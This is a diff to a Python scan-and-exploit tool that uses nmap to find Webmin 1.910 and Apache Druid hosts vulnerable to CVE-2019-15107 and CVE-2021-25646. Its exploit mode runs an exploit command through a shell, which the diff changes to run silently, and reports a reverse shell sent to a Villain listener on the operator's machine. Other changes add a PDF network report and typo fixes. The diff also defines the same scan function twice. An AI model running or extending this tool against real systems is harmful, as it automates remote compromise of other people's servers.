@@ -96,7 +96,7 @@ def ask_ip_range(scan_type):
                 print(RED +"Invalid network address format. Please provide a valid network range.")
 
 def net_fullscan_ask():
-    net_fullscan_asking = input(ENDC + "Do you want to run a deep scan for each discoverd host ? (Y/n)").lower()
+    net_fullscan_asking = input(ENDC + "Do you want to run a deep scan for each discovered host ? (Y/n)").lower()
     if net_fullscan_asking == "o" or net_fullscan_asking == "":
         net_fullscan = True
     else:
@@ -271,7 +271,46 @@ def network_fullscan(net_fullscan, hosts_list):
                     scanner.scan(host, arguments='-T5 -Pn -p 8080,8888,10000')
                 except nmap.PortScannerError as e:
                     print(f"Error scanning host {host}: {e}")
+                    pbar.update(1)
                     continue
+                
+                if host not in scanner.all_hosts():
+                    print(f"Host {host} not found in scan results.")
+                    pbar.update(1)
+                    continue
+
+                open_ports = [p for p in scanner[host]['tcp'].keys() if scanner[host]['tcp'][p]['state'] == 'open']
+                if not open_ports:
+                    open_ports_str = "none"
+                else:
+                    open_ports_str = ", ".join(map(str, open_ports))
+                print(f"Open ports for host {host}: {open_ports_str}")
+                if open_ports:
+                    result_dict_nw[host] = {'open_ports': open_ports, 'scan_details': scanner[host]}
+                pbar.update(1)
+    print(result_dict_nw)
+    return result_dict_nw
+
+
+def network_fullscan(net_fullscan, hosts_list):
+    result_dict_nw = {}  # Dictionary to store detailed scan results for each IP
+    if net_fullscan:
+        print("Starting deep scan on each host and port discovered...")
+        with tqdm(total=len(hosts_list)) as pbar:
+            for host in hosts_list:
+                scanner = nmap.PortScanner()
+                try:
+                    scanner.scan(host, arguments='-T5 -Pn -p 8080,8888,10000')
+                except nmap.PortScannerError as e:
+                    print(f"Error scanning host {host}: {e}")
+                    pbar.update(1)
+                    continue
+                
+                if host not in scanner.all_hosts():
+                    print(f"Host {host} not found in scan results.")
+                    pbar.update(1)
+                    continue
+
                 open_ports = [p for p in scanner[host]['tcp'].keys() if scanner[host]['tcp'][p]['state'] == 'open']
                 if not open_ports:
                     open_ports_str = "none"
@@ -281,6 +320,10 @@ def network_fullscan(net_fullscan, hosts_list):
                 if open_ports:
                     result_dict_nw[host] = better_scan(host, open_ports)
                 pbar.update(1)
+    return result_dict_nw
+
+
+
 
 def network_fullscan_exploit(net_fullscan, hosts_list, lhost):
     result_dict_nw = {}  # Dictionary to store detailed scan results for each IP
@@ -293,7 +336,14 @@ def network_fullscan_exploit(net_fullscan, hosts_list, lhost):
                     scanner.scan(host, arguments='-T5 -Pn -p 8080,8888,10000')
                 except nmap.PortScannerError as e:
                     print(f"Error scanning host {host}: {e}")
+                    pbar.update(1)
                     continue
+                
+                if host not in scanner.all_hosts():
+                    print(f"Host {host} not found in scan results.")
+                    pbar.update(1)
+                    continue
+
                 open_ports = [p for p in scanner[host]['tcp'].keys() if scanner[host]['tcp'][p]['state'] == 'open']
                 if not open_ports:
                     open_ports_str = "none"
@@ -303,6 +353,11 @@ def network_fullscan_exploit(net_fullscan, hosts_list, lhost):
                 if open_ports:
                     result_dict_nw[host] = better_scan_exploit(host, open_ports, lhost)
                 pbar.update(1)
+    
+    return result_dict_nw
+
+
+
 
 def check_CVEs(service_name, product, extra_info, version):
     if ('MiniServ' in product.lower() or 'webmin' in extra_info.lower()) and '1.910' in version:
@@ -331,7 +386,7 @@ def exploit_CVE_2019_15107(result_dict,lhost,port_number, adresse_ip):
                 )
                 try:
                     subprocess.run(
-                        exploit_cmd, shell=True, check=True, timeout=1
+                        exploit_cmd, shell=True, check=True, timeout=1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                     )
                 except subprocess.TimeoutExpired:
                     print(f"Exploit attempt done, reverse shell sent to Villain {lhost}")
@@ -442,6 +497,72 @@ def export_pdf_ip(result_dict):
 
         print(f"PDF export for {ip} done. Document saved as {doc_name}")
 
+def export_pdf_range(result_dict_nw, hosts_list, network_range):
+    network_range_filename = network_range.replace('/', '_')
+    doc_name = f"{network_range_filename}_report.pdf"
+    doc = SimpleDocTemplate(doc_name, pagesize=letter)
+
+    elements = []
+    styles = getSampleStyleSheet()
+
+    # Add title
+    title = f"Network Range Scan Report for {network_range}"
+    title_paragraph = Paragraph(title, styles['Title'])
+    elements.append(title_paragraph)
+
+    # Add section for list of hosts within the network
+    hosts_info = ", ".join(hosts_list)
+    hosts_paragraph = Paragraph(f"List of Hosts within the Network: {hosts_info}", styles['Normal'])
+    elements.append(hosts_paragraph)
+
+    # Add spacer for spacing between sections
+    elements.append(Spacer(1, 12))
+
+    # Add section with detailed scan information for each IP
+    elements.append(Paragraph("Detailed Scan Information for Each IP:", styles['Heading1']))
+    for ip, details in result_dict_nw.items():
+        # Add title for IP
+        title_ip = f"Scan report for {ip}"
+        title_paragraph_ip = Paragraph(title_ip, styles['Heading2'])
+        elements.append(title_paragraph_ip)
+
+        # Add spacer for spacing between title and port details
+        elements.append(Spacer(1, 6))
+
+        # Add port details
+        if ip not in details or 'ports' not in details[ip]:
+            elements.append(Paragraph("No port found on this IP.", styles['Normal']))
+            continue  # Skip this IP if no ports are found
+
+        ports = details[ip]['ports']
+
+        # Create a table for port details
+        ip_data = [["IP", "Port", "Service", "State", "Product", "Version", "Extra Info", "Vulnerability"]]
+        for port, port_details in ports.items():
+            port_number = port
+            service = port_details.get('name', '')
+            state = port_details.get('state', '')
+            product = port_details.get('product', '')
+            version = port_details.get('version', '')
+            extra_info = port_details.get('extrainfo', '')
+            vulnerability_code = port_details.get('vulnerability_detected', '')
+            vulnerability = map_vulnerability_code(vulnerability_code)
+            ip_data.append([ip, port_number, service, state, product, version, extra_info, vulnerability])
+
+        ip_table = Table(ip_data, repeatRows=1)
+        ip_table.setStyle(TableStyle([('BACKGROUND', (0, 0), (-1, 0), colors.lightgrey),
+                                      ('TEXTCOLOR', (0, 0), (-1, 0), colors.black),
+                                      ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
+                                      ('FONTNAME', (0, 0), (-1, -1), 'Helvetica-Bold'),
+                                      ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
+                                      ('BACKGROUND', (0, 1), (-1, -1), colors.white),
+                                      ('GRID', (0, 0), (-1, -1), 1, colors.black)]))
+        elements.append(ip_table)
+        elements.append(Spacer(1, 12))
+
+    doc.build(elements)
+
+    print(f"PDF export for network range done. Document saved as {doc_name}")
 
 
 # This function will map vulnerability codes to their corresponding CVE names
@@ -454,9 +575,9 @@ def map_vulnerability_code(vulnerability_code):
         return 'None'  # Return 'None' if no vulnerability detected
 
 def main():
-    parser = argparse.ArgumentParser(description="This script will make multiple scans on hosts or network. It's meant to detect and/or exploit CVE-2019-15107 (Webmin 1.910) and CVE-2021-25646 (Apache Druid). This tool is developped for educationnal purposes, please use it only if you have explicit consent and authorisation to do so.")
+    parser = argparse.ArgumentParser(description="This script will make multiple scans on hosts or network. It's meant to detect and/or exploit CVE-2019-15107 (Webmin 1.910) and CVE-2021-25646 (Apache Druid). This tool is developed for educational purposes, please use it only if you have explicit consent and authorization to do so.")
     parser.add_argument("-s", "--scan", action="store_true", help="Scan mode, this mode will attempt scans but will never exploit any vulnerability found.")
-    parser.add_argument("-e", "--exploit", action="store_true", help="Exploit mode, this mode works exaclty like scan mode BUT it will attempt to exploit any vulnerability found.")
+    parser.add_argument("-e", "--exploit", action="store_true", help="Exploit mode, this mode works exactly like scan mode BUT it will attempt to exploit any vulnerability found.")
 
     args = parser.parse_args()
 
@@ -475,18 +596,17 @@ def main():
             hosts_list = network_simple_scan(network_range, lhost)
             net_fullscan = net_fullscan_ask()
             if net_fullscan:  # Check if net_fullscan is True
-                network_fullscan(net_fullscan, hosts_list)
-
+                result_dict_nw = network_fullscan(net_fullscan, hosts_list)
+                export_pdf_range(result_dict_nw, hosts_list, network_range)
         # Prompt for single IP scan
         else:
             adresse_ip = ask_ip_range(scan_type)
             result_list = simple_scan(adresse_ip)
-            # Perform the detailed scan and export results to CSV
+            # Perform the detailed scan and export results to PDF
             result_dict = better_scan(adresse_ip, result_list)
             export_pdf_ip(result_dict)
 
     elif args.exploit:
-        
         print("Exploit mode activated...")
         lhost = get_current_ip()
         scan_type = choose_scan_type()
@@ -495,18 +615,18 @@ def main():
             hosts_list = network_simple_scan(network_range, lhost)
             net_fullscan = net_fullscan_ask()
             if net_fullscan:  # Check if net_fullscan is True
-                network_fullscan_exploit(net_fullscan, hosts_list, lhost)
-
+                result_dict_nw = network_fullscan_exploit(net_fullscan, hosts_list, lhost)
+                export_pdf_range(result_dict_nw, hosts_list, network_range)
         # Prompt for single IP scan
         else:
             adresse_ip = ask_ip_range(scan_type)
             result_list = simple_scan(adresse_ip)
-            # Perform the detailed scan and export results to CSV
+            # Perform the detailed scan and export results to PDF
             result_dict = better_scan_exploit(adresse_ip, result_list, lhost)
-
 
     else:
         parser.print_help()
+
 
 
 # Prompt for user input
